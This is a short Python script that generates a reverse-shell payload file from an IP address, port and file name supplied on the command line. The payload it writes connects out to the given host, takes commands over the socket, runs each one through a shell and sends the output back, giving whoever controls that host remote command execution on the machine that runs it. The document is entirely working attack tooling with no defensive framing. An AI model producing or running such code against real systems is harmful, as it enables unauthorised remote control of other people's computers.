import sys
import os

# Check if IP and port are passed as arguments
if len(sys.argv) != 4:
    print("Usage: python payload_generator.py <IP> <PORT> <PAYLOAD_NAME>")
    sys.exit(1)

ip = sys.argv[1]
port = sys.argv[2]
payload_name = sys.argv[3]

# Example of generating a reverse TCP payload in Python
payload = f'''
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{ip}", {port}))

while True:
    data = s.recv(1024)
    if data == b'quit':
        break
    output = subprocess.run(data.decode(), shell=True, capture_output=True)
    s.send(output.stdout + output.stderr)

s.close()
'''

# Save the payload to a Python file
with open(payload_name, 'w') as f:
    f.write(payload)

print(f"Payload saved to {payload_name}")
